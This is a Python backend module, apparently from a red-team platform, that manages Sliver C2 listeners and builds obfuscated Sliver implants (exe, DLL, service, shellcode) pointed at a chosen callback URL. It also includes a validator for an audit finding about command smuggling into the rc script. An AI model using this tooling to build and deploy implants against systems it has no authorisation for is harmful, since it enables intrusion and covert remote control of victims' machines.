"""Sliver operations backend — listeners (jobs) and implant generation.

Sliver listeners are jobs: mtls / https / dns / wg. sliver-py exposes a
stable async client (SliverClient + SliverClientConfig from the operator
JSON the integration already stores) — same connection path as the sync
integration in routers/c2/_sliver.py.

Implant generation maps the common UI vocabulary onto ImplantConfig:
format Exe -> EXECUTABLE, DLL -> SHARED_LIB, Service Exe -> SERVICE,
Shellcode -> SHELLCODE; the callback becomes the first C2 URL.
"""

from __future__ import annotations

import logging
import re

logger = logging.getLogger(__name__)

_FORMAT_MAP = {
    "Exe": "EXECUTABLE",
    "Service Exe": "SERVICE",
    "DLL": "SHARED_LIB",
    "Shellcode": "SHELLCODE",
}


async def _connected(cfg: dict):
    from sliver import SliverClient, SliverClientConfig

    blob = (cfg.get("config") or "").strip()
    if not blob:
        raise RuntimeError("Sliver operator config (JSON) is empty")
    config = SliverClientConfig.parse_config(blob)
    client = SliverClient(config)
    await client.connect()
    return client


async def list_listeners(cfg: dict) -> list[dict]:
    client = await _connected(cfg)
    jobs = await client.jobs()
    out = []
    for j in jobs:
        out.append(
            {
                "l_name": f"{getattr(j, 'Name', 'job')}-{getattr(j, 'ID', '')}",
                "l_reg_name": getattr(j, "Name", "job"),
                "l_status": "Listen",
                "l_bind_host": "",
                "l_bind_port": str(getattr(j, "Port", "")),
                "l_agent_addr": "",
                "job_id": getattr(j, "ID", 0),
            }
        )
    return out


async def create_listener(cfg: dict, body: dict) -> dict:
    client = await _connected(cfg)
    ltype = (body.get("listener_type") or "mtls").lower()
    port = int(body.get("port") or 8888)
    domains = body.get("domains") or []

    if ltype in ("mtls",):
        job = await client.start_mtls_listener(port=port)
    elif ltype in ("https", "http"):
        job = await client.start_https_listener(port=port, domains=domains)
    elif ltype == "dns":
        job = await client.start_dns_listener(port=port, domains=domains)
    elif ltype == "wg":
        job = await client.start_wg_listener(port=port)
    else:
        raise RuntimeError(f"Unsupported Sliver listener type: {ltype}")
    return {
        "ok": True,
        "listener": {
            "name": f"{getattr(job, 'Name', 'job')}-{getattr(job, 'ID', '')}",
            "type": ltype,
            "port": port,
            "callback": body.get("callback", ""),
        },
        "tls": {"terminated_at": "listener", "redirector": None, "ssl": True, "domain": ""},
        "exposure": {"ok": True, "mode": "sliver-job", "message": "Sliver job started"},
    }


async def stop_listener(cfg: dict, name: str, listener_type: str = "") -> dict:
    client = await _connected(cfg)
    jobs = await client.jobs()
    for j in jobs:
        candidate = f"{getattr(j, 'Name', 'job')}-{getattr(j, 'ID', '')}"
        if candidate == name or str(getattr(j, "ID", "")) == name:
            await client.kill_job(j.ID)
            return {"ok": True, "message": f"Job {name} stopped"}
    return {"ok": False, "message": f"No Sliver job matches '{name}'"}


_CLI_FORMAT_MAP = {
    "Exe": "exe",
    "Service Exe": "service-executable",
    "DLL": "shared",
    "Shellcode": "shellcode",
}


def _generate_via_cli(cfg: dict, callback: str, ltype: str, overrides: dict) -> dict:
    """Build the implant with the official sliver-client binary (--rc mode is
    fully non-interactive: commands run, then the client exits).

    Fallback for the gRPC path: Sliver >=1.6 servers reject Generate without
    ImplantConfig.HTTPC2ConfigName, which upstream sliver-py (0.0.19, incl.
    master) cannot set — the CLI sets it natively.
    """
    import base64
    import glob
    import os
    import subprocess
    import tempfile

    from fastapi import HTTPException

    if not os.path.isfile("/usr/local/bin/sliver-client"):
        raise HTTPException(
            501,
            "Sliver payload generation needs the sliver-client binary "
            "(/usr/local/bin/sliver-client) in the backend image; gRPC builds "
            "are blocked by upstream sliver-py (no ImplantConfig."
            "HTTPC2ConfigName).",
        )

    fmt = _CLI_FORMAT_MAP.get(overrides.get("format", "Exe"), "exe")
    os_name = overrides.get("os", "windows")
    arch = overrides.get("arch", "amd64")
    scheme = "https" if ltype in ("https", "http") else ("dns" if ltype == "dns" else "mtls")

    # Security audit 2026-10-07 (M5): these fields are interpolated into an
    # interpreted rc script — a newline or quote would smuggle extra console
    # commands into the sliver-client session. Reject anything outside the
    # boring charset each field legitimately needs.
    _RC_SAFE = re.compile(r"^[A-Za-z0-9_.:\[\]-]+$")

    from fastapi import HTTPException as _HTTPException

    for field_name, value in (("callback", callback), ("os", os_name), ("arch", arch)):
        if not _RC_SAFE.match(value or ""):
            raise _HTTPException(
                400,
                f"Sliver generate: invalid characters in {field_name} "
                "(allowed: letters, digits, . : [ ] - _)",
            )

    # The Go client resolves its config dir from the passwd entry (not $HOME),
    # so the operator config must land in the real home directory.
    real_home = os.path.expanduser("~")
    cfg_dir = os.path.join(real_home, ".sliver-client", "configs")
    os.makedirs(cfg_dir, exist_ok=True)
    cfg_name = f"umbryx-{os.urandom(4).hex()}.cfg"
    cfg_path = os.path.join(cfg_dir, cfg_name)

    with tempfile.TemporaryDirectory(prefix="sliver-gen-") as td:
        out_dir = os.path.join(td, "out")
        os.makedirs(out_dir)
        with open(cfg_path, "w") as f:
            f.write((cfg.get("config") or "").strip())
        rc_path = os.path.join(td, "gen.rc")
        with open(rc_path, "w") as f:
            f.write(
                f"generate --{scheme} {callback} --os {os_name} --arch {arch} "
                f"--format {fmt} --save {out_dir}\nexit\n"
            )
        try:
            proc = subprocess.run(
                ["/usr/local/bin/sliver-client", "--rc", rc_path],
                capture_output=True,
                text=True,
                timeout=420,
            )
        except subprocess.TimeoutExpired as exc:
            raise HTTPException(504, "Sliver implant build timed out (420s)") from exc
        finally:
            try:
                os.remove(cfg_path)
            except OSError:
                pass
        files = sorted(glob.glob(os.path.join(out_dir, "*")))
        if not files:
            raise HTTPException(
                502,
                f"Sliver CLI build produced no file: {proc.stdout[-300:]} {proc.stderr[-300:]}",
            )
        with open(files[0], "rb") as f:
            data = base64.b64encode(f.read()).decode()
        return {
            "ok": True,
            "filename": os.path.basename(files[0]),
            "payload": data,
            "config": overrides,
        }


async def generate_payload(cfg: dict, body: dict) -> dict:
    from fastapi import HTTPException
    from sliver.protobuf import client_pb2

    _conf = client_pb2.ImplantConfig()
    if "HTTPC2ConfigName" not in [f.name for f in _conf.DESCRIPTOR.fields]:
        # gRPC path unavailable (upstream sliver-py lag) — CLI fallback.
        overrides = body.get("config") or {}
        callback = body.get("callback") or overrides.get("callback") or ""
        ltype = (body.get("listener_type") or "mtls").lower()
        if not callback:
            client = await _connected(cfg)
            port = str(body.get("port") or "")
            if not port and body.get("listener"):
                jobs = await client.jobs()
                for j in jobs:
                    cand = f"{getattr(j, 'Name', 'job')}-{getattr(j, 'ID', '')}"
                    if cand == body.get("listener") or getattr(j, "Name", "") == body.get("listener"):
                        port = str(getattr(j, "Port", ""))
                        break
            if port:
                host = (cfg.get("url") or "").split("//")[-1].split(":")[0]
                scheme = "https" if ltype in ("https", "http") else ("dns" if ltype == "dns" else "mtls")
                callback = f"{scheme}://{host}:{port}"
        if not callback:
            raise HTTPException(400, "callback or a live listener is required for CLI builds")
        return _generate_via_cli(cfg, callback, ltype, overrides)

    client = await _connected(cfg)
    overrides = body.get("config") or {}
    callback = body.get("callback") or overrides.get("callback") or ""
    ltype = (body.get("listener_type") or "mtls").lower()

    c2_cfg = None
    if not callback:
        # Sliver needs an explicit C2 URL in the implant config; build one
        # from the integration host + the listener job's port.
        port = str(body.get("port") or "")
        if not port and body.get("listener"):
            jobs = await client.jobs()
            for j in jobs:
                cand = f"{getattr(j, 'Name', 'job')}-{getattr(j, 'ID', '')}"
                if cand == body.get("listener") or getattr(j, "Name", "") == body.get("listener"):
                    port = str(getattr(j, "Port", ""))
                    break
        if port:
            host = (cfg.get("url") or "").split("//")[-1].split(":")[0]
            scheme = "https" if ltype in ("https", "http") else ("dns" if ltype == "dns" else "mtls")
            callback = f"{scheme}://{host}:{port}"
    if callback:
        c2_cfg = client_pb2.ImplantC2(URL=callback, Priority=1, Options="")
        if ltype in ("https", "http"):
            c2_cfg.Options = ""

    fmt = _FORMAT_MAP.get(overrides.get("format", "Exe"), "EXECUTABLE")
    cfg_proto = client_pb2.ImplantConfig(
        IsBeacon=False,
        C2=[c2_cfg] if c2_cfg else [],
        GOOS=overrides.get("os", "windows"),
        GOARCH=overrides.get("arch", "amd64"),
        Format=getattr(client_pb2.OutputFormat, fmt, client_pb2.OutputFormat.EXECUTABLE),
        ObfuscateSymbols=True,
        Debug=False,
    )
    implant = await client.generate_implant(cfg_proto)

    ext = {"EXECUTABLE": "exe", "SHARED_LIB": "dll", "SERVICE": "exe", "SHELLCODE": "bin"}.get(fmt, "bin")
    return {
        "ok": True,
        "filename": f"sliver_{overrides.get('os', 'windows')}_{overrides.get('arch', 'amd64')}.{ext}",
        "payload": implant,
        "config": overrides,
    }
